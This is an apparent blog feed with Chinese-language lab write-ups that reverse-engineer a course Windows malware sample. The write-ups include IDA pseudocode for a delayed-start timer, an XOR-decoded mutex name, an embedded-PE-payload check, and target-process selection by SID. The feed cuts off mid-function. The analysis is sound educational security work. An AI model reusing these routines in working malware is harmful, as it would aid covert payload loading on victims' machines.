&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_FILETIME&lt;/span> FileTime; &lt;span style="color:#75715e">// [rsp+48h] [rbp-20h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> LARGE_INTEGER DueTime; &lt;span style="color:#75715e">// [rsp+50h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wYear &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2023&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMonth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wDay &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wDayOfWeek &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wHour &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMinute &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wSecond &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMilliseconds &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> SystemTimeToFileTime(&lt;span style="color:#f92672">&amp;amp;&lt;/span>SystemTime, &lt;span style="color:#f92672">&amp;amp;&lt;/span>FileTime);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DueTime &lt;span style="color:#f92672">=&lt;/span> FileTime;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Result &lt;span style="color:#f92672">=&lt;/span> CreateWaitableTimerW(&lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hTimer &lt;span style="color:#f92672">=&lt;/span> Result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> SetWaitableTimer(Result, &lt;span style="color:#f92672">&amp;amp;&lt;/span>DueTime, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> WaitForSingleObject(hTimer, &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> Result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>攻擊者的完整意圖&lt;/p></description></item><item><title>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/</guid><description>&lt;h1 id="simple-reverse---0x182023-lab---winmalware---sub_140001120">
 Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)
 &lt;a class="anchor" href="#simple-reverse---0x182023-lab---winmalware---sub_140001120">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001120 在做什麼，並找出其所建立的 Mutex 的名稱。
Flag format: FLAG{mutex_name}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createmutexa">CreateMutexA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/sync/using-mutex-objects">使用 Mutex 物件&lt;/a>
&lt;blockquote>
&lt;p>可以使用 mutex 物件 來保護共用資源，避免多個執行緒或進程同時存取。 每個執行緒都必須等候 mutex 的擁有權，才能執行可存取共用資源的程式碼。 例如，如果數個執行緒共用資料庫的存取權，執行緒可以使用 mutex 物件一次只允許一個執行緒寫入資料庫。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/debug/system-error-codes--0-499-">系統錯誤碼 (0-499)&lt;/a>
&lt;blockquote>
&lt;p>ERROR_ALREADY_EXISTS
183 (0xB7)
無法建立檔案，該檔案已存在。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001120
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">sub_140001120&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{ 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE MutexA; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+20h] [rbp-78h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v3[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [rsp+30h] [rbp-68h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Name[&lt;span style="color:#ae81ff">32&lt;/span>]; &lt;span style="color:#75715e">// [rsp+38h] [rbp-60h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v5[&lt;span style="color:#ae81ff">32&lt;/span>]; &lt;span style="color:#75715e">// [rsp+58h] [rbp-40h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1684234874&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> qmemcpy(v5, &lt;span style="color:#f92672">&amp;amp;&lt;/span>unk_140003348, &lt;span style="color:#ae81ff">0x1Du&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Name[i] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(v3 &lt;span style="color:#f92672">+&lt;/span> i &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">^&lt;/span> v5[i];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MutexA &lt;span style="color:#f92672">=&lt;/span> CreateMutexA(&lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">1&lt;/span>, Name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( MutexA )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(MutexA) &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( MutexA &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">183&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> MutexA;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照&lt;code>0x64, 0x63, 0x62, 0x7A&lt;/code>的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor&lt;/p></description></item><item><title>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/</guid><description>&lt;h1 id="simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload">
 Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)
 &lt;a class="anchor" href="#simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>取出 eductf-lab.exe 中的 next stage payload (embedded PE file)，並計算其 MD5 hash。
Flag format: FLAG{462fe0000&amp;hellip;} (hex character must be lowercase)&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>DOS Header
&lt;img src="https://hackmd.io/_uploads/HJ9P9gpfp.png" alt="" />&lt;/li>
&lt;li>NT Headers - Optional Header
&lt;img src="https://hackmd.io/_uploads/SkjNqeazT.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001870
:::spoiler IDA Source Code解析前
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_140001870&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>pe_file, _QWORD &lt;span style="color:#f92672">*&lt;/span>pe_file_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pe_file &lt;span style="color:#f92672">=&lt;/span> byte_140005040;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pe_file_size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">72770&lt;/span>i64; &lt;span style="color:#75715e">// 這是個是怎麼判斷成PE size我也不知道
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">**&lt;/span>pe_file &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>ZM&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(sub_1400013D0(&lt;span style="color:#f92672">*&lt;/span>pe_file) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x20B&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote dll optional header magic check failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;remote dll magic check failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>進到&lt;code>sub_140001BF0&lt;/code>之後可以先觀察&lt;code>sub_140001870&lt;/code>，前面有source code可以看到他正在比對&lt;code>byte_140005040&lt;/code>的前面兩個字元是不是等於&lt;code>MZ&lt;/code>，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中
:::info
如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把&lt;code>byte_140005040&lt;/code>改變他的type，變成&lt;code>char[72770]&lt;/code>，再用Shift+E，把raw data export出來，丟到&lt;a href="https://emn178.github.io/online-tools/md5_checksum.html">online md5 checksum&lt;/a>，就可以得到這支檔案的hash(&lt;code>462fe0007f86957f59824e113f78947c&lt;/code>)
&lt;img src="https://hackmd.io/_uploads/SJoeiepGT.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rk7SigpGp.png" alt="" />
:::&lt;/li>
&lt;li>&lt;code>sub_1400013D0&lt;/code>仔細看他的操作，其實就是把&lt;code>byte_140005040&lt;/code>的地址，加上&lt;code>0x3C&lt;/code>，再取值，就是&lt;code>e_lfanew&lt;/code>，也就是NT Headers的file offset，這個offset加上原本的原本的&lt;code>140005040&lt;/code>就是NT header，所以可以把&lt;code>sub_1400013D0&lt;/code> rename成&lt;code>getNtHdr&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">getNtHdr&lt;/span>(&lt;span style="color:#66d9ef">__int64&lt;/span> a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x3C&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> a1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>接下來可以改變這個function的type，按Y，&lt;code>改IMAGE_NT_HEADERS *__fastcall getNtHdr(_QWORD)&lt;/code>，就變得非常簡潔好看，另外，要把&lt;code>pe_file&lt;/code>的type從&lt;code>_int64&lt;/code>改成&lt;code>_QWORD&lt;/code>的原因是&lt;code>pe_file&lt;/code>存的是&lt;code>byte_140005040&lt;/code>的地址，不是數字，雖然代表的byte數一樣，但意義不相同，所以IDA可能會解析不出來
&lt;img src="https://hackmd.io/_uploads/ryHl0gaG6.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rJniAlaM6.png" alt="" />&lt;/li>
&lt;li>最後就把目前的這個sub function rename成&lt;code>getEmbeddedPE_File&lt;/code>就可以了&lt;/li>
&lt;/ol>
&lt;p>:::info
&lt;img src="https://hackmd.io/_uploads/HJaNxWpzp.png" alt="" />
:::
:::spoiler 解析後&lt;/p></description></item><item><title>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/</guid><description>&lt;h1 id="simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2">
 Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)
 &lt;a class="anchor" href="#simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32firstw">Process32FirstW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess">GetCurrentProcess&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess">OpenProcess&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-equalsid">EqualSid&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-process32nextw">Process32NextW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">OpenProcessToken&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation">GetTokenInformation&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_1400016B0
:::spoiler IDA Source Code解析前
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#a6e22e">returnTargetPid&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD LastError; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD v2; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR &lt;span style="color:#f92672">*&lt;/span>szExeFile; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">signed&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v4; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> WCHAR v5; &lt;span style="color:#75715e">// dx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v6; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD th32ProcessID; &lt;span style="color:#75715e">// [rsp+20h] [rbp-288h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hSnapshot; &lt;span style="color:#75715e">// [rsp+28h] [rbp-280h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hObject; &lt;span style="color:#75715e">// [rsp+30h] [rbp-278h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE CurrentProcess; &lt;span style="color:#75715e">// [rsp+38h] [rbp-270h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PSID pSid1; &lt;span style="color:#75715e">// [rsp+40h] [rbp-268h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PSID pSid2; &lt;span style="color:#75715e">// [rsp+48h] [rbp-260h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> PROCESSENTRY32W pe; &lt;span style="color:#75715e">// [rsp+50h] [rbp-258h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hSnapshot &lt;span style="color:#f92672">=&lt;/span> CreateToolhelp32Snapshot(&lt;span style="color:#ae81ff">2u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( hSnapshot &lt;span style="color:#f92672">==&lt;/span> (HANDLE)&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>i64 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LastError &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;CreateToolhelp32Snapshot failed with error %lu&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, LastError);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pe.dwSize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">568&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Process32FirstW(hSnapshot, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pe) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pSid2 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x44u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CurrentProcess &lt;span style="color:#f92672">=&lt;/span> GetCurrentProcess();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001500(CurrentProcess, &lt;span style="color:#f92672">&amp;amp;&lt;/span>pSid2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> th32ProcessID &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pSid1 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x44u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hObject &lt;span style="color:#f92672">=&lt;/span> OpenProcess(&lt;span style="color:#ae81ff">0x400u&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, pe.th32ProcessID);
